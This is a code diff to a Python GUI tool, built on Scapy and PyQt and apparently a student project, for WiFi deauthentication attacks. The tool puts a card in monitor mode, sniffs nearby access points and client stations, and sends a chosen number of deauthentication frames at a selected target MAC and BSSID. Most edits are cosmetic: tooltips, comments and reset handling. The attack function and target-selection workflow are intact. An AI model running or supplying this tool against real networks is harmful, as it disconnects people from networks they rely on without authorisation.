@@ -21,6 +21,7 @@ resetflag = False
 framecount = 0
 breaksniff_flag = False
 showStationButton = False
+
 print("SCAPY VERSION USED: "+ scapy._version())
 print("Python Version Used: "+ sys.version)
 
@@ -37,13 +38,8 @@ def setChannel():
     return "breaking"
 
 
-
-
 def setMonitorMode():
-    """
 
-    :return:
-    """
     checkphrase_mon_success = "monitor mode vif enabled"
     checkphrase_mon = "Mode:Monitor"
 
@@ -60,20 +56,8 @@ def setMonitorMode():
             raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")
 
 
-
-
 def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):
 
-    """
-    interface, is the wireless interface
-    destination is the target we wish to deuath
-    bssid is the mac address of the AP. (string, MAC)
-
-    :param interface:
-    :param dest:
-    :param bssid:
-    :return:
-    """
     #global channel_attack_value only need to set it as globa in a function, if it is to be altered.
     global framecount #ville gerne bare kunne returne frame count af funktionen aka. i værdien, i forloopet, men problemet er at den er nødt til at køre som en Thread.
 
@@ -109,6 +93,7 @@ def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):
 
     for i in range(0,amount):
         print("sent a frame...... "+str(i))
+
         sendp(frame,iface=interface,verbose=False)
         #end = time.time()
         #print(end - start)
@@ -121,37 +106,43 @@ def perform_deauth_attack(interface,dest,bssid,amount,channel_attack):
     print("TOTAL frameS SENT: ")
     print(framecount)
 
-    #endTOTAL = time.time()
-    #print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath frames in a for loop.
-
 
 class App(QMainWindow):
     def __init__(self):
         super(App,self).__init__()
-        self.title = "DeAuthentication Attack"
+
+        self.title = "Deauthentication Attack"
+        self.setWindowIcon(QtGui.QIcon('dtu.jpeg'))
         self.setupUI()
+
+        self.setStyleSheet("""QToolTip {
+                           background-color: black;
+                           color: white;
+                           border: black solid 1px
+                           }""")
 
 
 
     def setupUI(self):
         global framecount
         setMonitorMode()
+
         self.setWindowTitle(self.title)
         self.setGeometry(50,50,700,700)
 
-
-        #MAC AP
+        #BSSID for the AP for the attack
         self.textboxAP = QLineEdit(self)
         self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
         self.textboxAP.move(20,30)
         self.textboxAP.resize(280, 40)
-        #MAC TARGET
+
+        #Target of the attack (MAC address)
         self.textbox = QLineEdit(self)
         self.textbox.setPlaceholderText("Enter the target MAC address")
         self.textbox.move(20,80)
         self.textbox.resize(280,40)
 
-        #AMOUNT
+        #Frame Amount line
         self.textbox_amount = QLineEdit(self)
         self.textbox_amount.setPlaceholderText("Enter amount of frames")
         self.textbox_amount.move(20,130)
@@ -165,6 +156,7 @@ class App(QMainWindow):
 
         ##ATTACK button
         self.attackbutton = QPushButton('ATTACK',self)
+        self.attackbutton.setToolTip("Click to start the attack")
         self.attackbutton.resize(200,50)
         self.attackbutton.move(350,30)
         self.attackbutton.clicked.connect(self.on_attackclick)
@@ -174,13 +166,14 @@ class App(QMainWindow):
         self.resetbutton.resize(200,50)
         self.resetbutton.move(350,100)
         self.resetbutton.clicked.connect(self.on_resetclick)
+        self.resetbutton.setToolTip("Click to reset everything")
 
-
-        ##SNIFF BUTTON
+        ##SNIFF SSID/BSSID button
         self.sniffSSIDbutton = QPushButton('Sniff SSIDs',self)
         self.sniffSSIDbutton.resize(200,50)
         self.sniffSSIDbutton.move(350,170)
         self.sniffSSIDbutton.clicked.connect(self.on_ssidsniff)
+        self.sniffSSIDbutton.setToolTip("Click to start sniffing for AP's")
 
         ##SNIFF STATION BUTTON
         self.sniffStationbutton = QPushButton('Sniff Stations',self)
@@ -188,22 +181,22 @@ class App(QMainWindow):
         self.sniffStationbutton.resize(200,50)
         self.sniffStationbutton.move(350,240)
         self.sniffStationbutton.clicked.connect(self.on_stationsniff)
+        self.sniffStationbutton.setToolTip("Click to start sniffing for stations")
 
-
+        #Stop sniffing button
         self.stopbutton = QPushButton('STOP',self)
         self.stopbutton.resize(200,50)
         self.stopbutton.move(350,310)
         self.stopbutton.clicked.connect(self.on_stopclick)
-
-
+        self.stopbutton.setToolTip("Click to stop sniffing")
 
         #frame AMOUNT LABEL
-        self.framelabel = QLabel("Sent : "+str(framecount)+"\n"+"DeAuthentication frames",self)
+        self.framelabel = QLabel("Sent : "+str(framecount)+"\n"+"Deauthentication frames",self)
         self.framelabel.setFont(QtGui.QFont("Times",weight=QtGui.QFont.Bold))
         self.framelabel.move(20,230)
         self.framelabel.resize(270,100)
 
-        #evt. lav QTextEdit?
+        #QListWidget for SSID/BSSID
         self.sniffbox = QListWidget(self)
         self.sniffbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
         self.sniffbox.itemSelectionChanged.connect(self.on_sniffClick)
@@ -211,7 +204,7 @@ class App(QMainWindow):
         self.sniffbox.resize(600,310)
 
 
-        #evt. lav QTextEdit?
+        #QListWidget for the STA's
         self.sniffStationbox = QListWidget(self)
         self.sniffStationbox.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
         self.sniffStationbox.itemSelectionChanged.connect(self.on_stationClick)
@@ -231,18 +224,17 @@ class App(QMainWindow):
         if (len(self.sniffStationbox.selectedItems()) != 0):
             self.textbox.setText((self.sniffStationbox.selectedItems()[0]).text()[15:32]) # Substring : AP Mac adress
 
-
-
     def checkifstop(self, frame):
         if breaksniff_flag == True:
             self.sniffbox.addItem("Sniffing stopped")
             self.sniffStationbox.addItem("Sniffing stopped")
             return "breaking"
 
+
     def FindSSIDtest(self,frame):
         global breaksniff_flag
 
-        #we try a random channel every call, in an external thread
+        #we try a new channel every call, in an external thread
         moncheck = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel_value)], stderr=subprocess.PIPE).decode("UTF-8")
 
         if frame.haslayer(Dot11): #der kunne bare stå haslayer(Dot11Beacon)
@@ -257,16 +249,11 @@ class App(QMainWindow):
                     self.sniffbox.addItem("Found BSSID " + BSSID + " and SSID "+SSID +" on channel: " +str(ch))
                     #print(ssid_bssid)
 
-                    #if time.time() > 10:
-                        #print(time.time())
-                        #breaksniff_flag = True
-
     def FindSTAinSpecificBSSID(self,bssidsearch,frame,channel):
         global channel_enganged
         if channel_enganged == False:
             moncheck = check_output(["sudo", "iwconfig", "wlan0mon", "channel", str(channel)], stderr=subprocess.PIPE).decode("UTF-8")
             channel_enganged = True
-
 
         BSSID = "ff:ff:ff:ff:ff:ff"
 
@@ -301,22 +288,21 @@ class App(QMainWindow):
                     SA = "ff:ff:ff:ff:ff:ff"  # dette burde ikke kunne ske
                     BSSID = "ff:ff:ff:ff:ff:ff"
 
-                if (SA not in STA_list and BSSID == bssidsearch):
+                if SA not in STA_list and BSSID == bssidsearch:
+
                     STA_list.append(SA)
                     self.sniffStationbox.addItem("Found Station: " + SA + " From AccessPoint: " + BSSID)
                     print("Found Station: " + SA + " From AccessPoint: " + BSSID)
 
 
     def update_attacklabel(self):
-        self.framelabel.setText("Sent : " + str(framecount) + "\n" + "DeAuthentication Frames")
+        self.framelabel.setText("Sent : " + str(framecount) + "\n" + "Deuthentication Frames")
 
     def snifferfunction(self):
         sniff(iface="wlan0mon", count=0, prn=self.FindSSIDtest, store=0,stop_filter=self.checkifstop)
 
 
     def stationSniffer(self):
-        #print(self.textboxAP.text())
-        #print(self.channeltextbox.text())
         sniff(iface="wlan0mon", count=0, prn= lambda fr: self.FindSTAinSpecificBSSID(self.textboxAP.text(),fr,self.channeltextbox.text()), store=0, stop_filter=self.checkifstop)
 
 
@@ -330,7 +316,7 @@ class App(QMainWindow):
         self.sniffStationbox.show()
 
         breaksniff_flag = False
-        print("started station sniff")
+        print("STARTED STATION SNIFF")
 
 
         stationthread = threading.Thread(target = self.stationSniffer)
@@ -351,22 +337,13 @@ class App(QMainWindow):
 
 
         breaksniff_flag = False
-        print("started bssid sniff")
-        #self.sniffbox.setText(ssid_bssid[0])
+        print("STARTED SSID/BSSID SNIFF")
+
         channelThread = threading.Thread(target = setChannel)
         channelThread.start()
 
         sniffingthread = threading.Thread(target = self.snifferfunction)
         sniffingthread.start()
-
-        #sniffupdate = threading.Thread(target = self.sniffevent)
-        #sniffupdate.start()
-
-        # kan ikke lave check med is_alive her, da det vil bugge programmet op.
-
-
-        #print("thread dead")
-
 
 
 
@@ -376,16 +353,13 @@ class App(QMainWindow):
         global framecount
         print("AMOUNT OF ACTIVE THREADS" + str(threading.active_count()))
 
-
         resetflag = False
-
 
         self.textboxAP.setEnabled(False)
         self.textbox.setEnabled(False)
         self.textbox_amount.setEnabled(False)
         self.channeltextbox.setEnabled(False)
-        #self.textboxAP.setText("40:F2:01:9A:42:56")#test remove me
-        #self.textbox.setText("94:65:2D:D8:2E:16") #test remove me
+
 
         bssid_targetMAC = self.textboxAP.text() #string
         destMAC = self.textbox.text() #string
@@ -405,15 +379,6 @@ class App(QMainWindow):
 
 
             timer.start(2)#updatere lige nu hvert 2'ende milisekund, det måske LIDT for hurtigt, men det fungerer fint.
-
-            #while attackthread.is_alive():
-                #self.framelabel.setText("Sent : "+str(framecount)+"\n"+"DeAuthentication Frames")
-                #self.framelabel.repaint() #need to repaint the label each iteration to update value
-
-            #self.framelabel.setText("Sent : " + str(framecount) + "\n" + "DeAuthentication Frames")
-            #self.framelabel.repaint()
-
-
 
         else:
             self.textbox_amount.setPlaceholderText("Enter amount of frames")
@@ -439,11 +404,12 @@ class App(QMainWindow):
         global resetflag
         global framecount
         global breaksniff_flag
-
+        global channel_value
         self.textbox.clear()
         self.textboxAP.clear()
         self.textbox_amount.clear()
         self.channeltextbox.clear()
+        self.sniffbox.clear()
         self.textboxAP.setEnabled(True)
         self.textbox.setEnabled(True)
         self.textbox_amount.setEnabled(True)
@@ -452,14 +418,15 @@ class App(QMainWindow):
         self.textbox.setPlaceholderText("Enter the target MAC address")
         self.textbox_amount.setPlaceholderText("Enter amount of frames")
         self.channeltextbox.setPlaceholderText("Enter the channel for the attack")
-
+        self.sniffStationbutton.hide()
         resetflag = True
         breaksniff_flag = True
         framecount = 0
-        self.framelabel.setText("Sent : " + str(framecount) + "\n" + "DeAuthentication Frames")
+        channel_value = 1
+        del ssid_bssid[:]
+        del STA_list[:]
+        self.framelabel.setText("Sent : " + str(framecount) + "\n" + "Deauthentication Frames")
         self.framelabel.repaint()
-
-        #self.sniffbox.setText(ssid_bssid[0])
 
 
 if __name__ == '__main__':
